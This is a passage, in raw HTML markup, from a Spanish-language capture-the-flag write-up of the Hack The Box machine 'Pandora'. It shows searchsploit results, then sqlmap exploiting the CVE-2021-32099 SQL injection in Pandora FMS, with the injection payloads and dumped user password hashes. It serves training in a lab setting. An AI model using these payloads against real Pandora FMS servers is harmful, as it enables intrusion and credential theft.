&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Vemos el login de Pandora y en el footer la version: v7.0NG.742_FIX_PERL2020.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/pandora/Screenshot_20220129_212334.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Tras intentar ingresar con las credenciales nos muestra que el usuario unicamente puede utilizar la &lt;strong&gt;API&lt;/strong&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/pandora/Screenshot_20220129_212831.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;sql-injection&#34;&gt;SQL Injection&lt;/h2&gt;
&lt;p&gt;Vemos multiples vulnerabilidades y exploits con &lt;code&gt;searchsploit&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; π ~/htb/pandora ❯ searchsploit Pandora &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt;
 -------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                             &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;  Path
--------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Pandora 7.0NG - Remote Code Execution                                                                                      &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; php/webapps/47898.py
Pandora Fms - Remote Code Execution &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Metasploit&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;                                                                           &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; linux/remote/31518.rb
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;.. snip ..&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
Pandora FMS 7.0 NG &lt;span class=&#34;m&#34;&gt;749&lt;/span&gt; - &lt;span class=&#34;s1&#34;&gt;&amp;#39;CG Items&amp;#39;&lt;/span&gt; SQL Injection &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Authenticated&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;                                                          &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; php/webapps/49046.txt
Pandora FMS 7.0 NG &lt;span class=&#34;m&#34;&gt;749&lt;/span&gt; - Multiple Persistent Cross-Site Scripting Vulnerabilities                                          &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; php/webapps/49139.txt
Pandora FMS 7.0 NG &lt;span class=&#34;m&#34;&gt;750&lt;/span&gt; - &lt;span class=&#34;s1&#34;&gt;&amp;#39;Network Scan&amp;#39;&lt;/span&gt; SQL Injection &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Authenticated&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;                                                      &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; php/webapps/49312.txt
Pandora FMS 7.0NG - &lt;span class=&#34;s1&#34;&gt;&amp;#39;net_tools.php&amp;#39;&lt;/span&gt; Remote Code Execution                                                                  &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; php/webapps/48280.py
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;.. snip ..&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
PANDORAFMS 7.0 - Authenticated Remote Code Execution                                                                       &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; php/webapps/48064.py
PandoraFMS 7.0 NG &lt;span class=&#34;m&#34;&gt;746&lt;/span&gt; - Persistent Cross-Site Scripting                                                                    &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; php/webapps/48707.txt
PandoraFMS NG747 7.0 - &lt;span class=&#34;s1&#34;&gt;&amp;#39;filename&amp;#39;&lt;/span&gt; Persistent Cross-Site Scripting                                                          &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; php/webapps/48700.txt
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;.. snip ..&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
--------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
 π ~/htb/pandora ❯
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Además vemos un post &lt;a href=&#34;https://blog.sonarsource.com/pandora-fms-742-critical-code-vulnerabilities-explained&#34;&gt;Pandora FMS 742: Critical Code Vulnerabilities Explained&lt;/a&gt; donde explican una vulnerabilidad de SQL Injection (CVE-2021-32099). El parametro &lt;code&gt;session_id&lt;/code&gt; en &lt;code&gt;/include/chart_generator.php&lt;/code&gt; es donde se encuentra esta vulnerabilidad, utilizamos &lt;code&gt;sqlmap&lt;/code&gt; para explotarla, logramos listar las bases de datos y algunos hashes.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; π ~/htb/pandora ❯ sqlmap -u &lt;span class=&#34;s2&#34;&gt;&amp;#34;http://127.0.0.1/pandora_console/include/chart_generator.php?session_id=0&amp;#34;&lt;/span&gt; -p &lt;span class=&#34;s2&#34;&gt;&amp;#34;session_id&amp;#34;&lt;/span&gt; --batch --dbs
        ___
       __H__
 ___ ___&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;]_____ ___ ___  {1.5.8#stable}
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;|_ -| . [&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;     &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; .&lt;span class=&#34;s1&#34;&gt;&amp;#39;| . |
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;|___|_  [.]_|_|_|__,|  _|
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;      |_|V...       |_|   http://sqlmap.org
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&amp;#39;&lt;/span&gt;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; any misuse or damage caused by this program

&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; starting @ 03:35:48 /2022-01-30/

&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;03:35:48&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;INFO&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; resuming back-end DBMS &lt;span class=&#34;s1&#34;&gt;&amp;#39;mysql&amp;#39;&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;03:35:48&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;INFO&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; testing connection to the target URL
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;03:35:48&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;WARNING&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; potential permission problems detected &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Access denied&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
you have not declared cookie&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;s&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;, &lt;span class=&#34;k&#34;&gt;while&lt;/span&gt; server wants to &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; its own &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;PHPSESSID=49h82n6fl3a...e1lh0erc14&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;. Do you want to use those &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Y/n&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Y
sqlmap resumed the following injection point&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;s&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; from stored session:
---
Parameter: session_id &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;GET&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;MySQL comment&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
    Payload: &lt;span class=&#34;nv&#34;&gt;session_id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-1919&lt;span class=&#34;s1&#34;&gt;&amp;#39; OR 3360=3360#
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;    Type: error-based
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;    Title: MySQL &amp;gt;= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;    Payload: session_id=123&amp;#39;&lt;/span&gt; OR &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;SELECT &lt;span class=&#34;m&#34;&gt;5135&lt;/span&gt; FROM&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;SELECT COUNT&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;,CONCAT&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0x71706b7071,&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;SELECT &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ELT&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;5135&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;5135,1&lt;span class=&#34;o&#34;&gt;)))&lt;/span&gt;,0x7162707671,FLOOR&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RAND&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;*2&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;a&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;-- RrkX

    Type: time-based blind
    Title: MySQL &amp;gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; 5.0.12 AND time-based blind &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;query SLEEP&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
    Payload: &lt;span class=&#34;nv&#34;&gt;session_id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;123&lt;span class=&#34;s1&#34;&gt;&amp;#39; AND (SELECT 8279 FROM (SELECT(SLEEP(5)))JNxp)-- LEOI
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;---
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;[03:35:48] [INFO] the back-end DBMS is MySQL
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;web server operating system: Linux Ubuntu 20.04 or 19.10 (eoan or focal)
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;web application technology: PHP, Apache 2.4.41
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;back-end DBMS: MySQL &amp;gt;= 5.0 (MariaDB fork)
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;[03:35:48] [INFO] fetching database names
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;[03:35:48] [INFO] resumed: &amp;#39;&lt;/span&gt;information_schema&lt;span class=&#34;s1&#34;&gt;&amp;#39;
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;[03:35:48] [INFO] resumed: &amp;#39;&lt;/span&gt;pandora&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;
available databases &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;2&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;:
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; information_schema
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; pandora

&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Sin embargo los hashes no se encuentran en servicios online como &lt;code&gt;crackstation.net&lt;/code&gt; o el wordlist &lt;code&gt;rockyou.txt&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# sqlmap -u &amp;#34;http://127.0.0.1/pandora_console/include/chart_generator.php?session_id=0&amp;#34; -p &amp;#34;session_id&amp;#34; --batch -D pandora -T tusuario -C email,firstname,lastname,fullname,id_user,is_admin,password --dump&lt;/span&gt;
Database: pandora
Table: tusuario
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; entries&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+--------------------+-----------+----------+---------------+---------+----------+----------------------------------+
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; email              &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; firstname &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; lastname &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; fullname      &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; id_user &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; is_admin &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; password                         &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
+--------------------+-----------+----------+---------------+---------+----------+----------------------------------+
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; admin@pandora.htb  &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &amp;lt;blank&amp;gt;   &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &amp;lt;blank&amp;gt;  &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Pandora Admin &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; admin   &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;        &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ad3f741b04bd5880fb32b54bc4f43d6a &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; daniel@pandora.htb &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &amp;lt;blank&amp;gt;   &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &amp;lt;blank&amp;gt;  &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Daniel        &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; daniel  &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;        &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; 76323c174bd49ffbbdedf678f6cc89a6 &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; matt@pandora.htb   &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &amp;lt;blank&amp;gt;   &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &amp;lt;blank&amp;gt;  &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Matt          &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; matt    &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;        &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; f655f807365b6dc602b31ab3d6d43acc &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
+--------------------+-----------+----------+---------------+---------+----------+----------------------------------+
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Además el único privilegio del usuario actual es &lt;code&gt;USAGE&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;database management system users privileges:
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;pandora&amp;#39;&lt;/span&gt;@&lt;span class=&#34;s1&#34;&gt;&amp;#39;localhost&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;1&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;:
    privilege: USAGE
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;En el post menciona que se puede obtener acceso como administrador cargando el ID de este, aunque tras realizar distintos querys manualmente no logramos obtener acceso.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;This way, any user can be impersonated including an administrator with full access privileges by loading its user ID. As a result, the SQL Injection can be used to authenticate as any user.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Dentro de la base de datos existen tablas que contienen información de la sesion de los usuarios.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;9
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;Database: pandora
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;178&lt;/span&gt; tables&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+------------------------------------+
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;.. snip ..&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; tsesion                            &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; tsesion_extended                   &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; tsessions_php                      &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;.. snip ..&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+------------------------------------+
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;En la tabla &lt;code&gt;tsessions_php&lt;/code&gt; podemos listar informacion de las sesiones o cookies, pero, la cantidad de datos es muy alta.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;Database: pandora
Table: tsessions_php
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; columns&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+-------------+----------+
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Column      &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Type     &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
+-------------+----------+
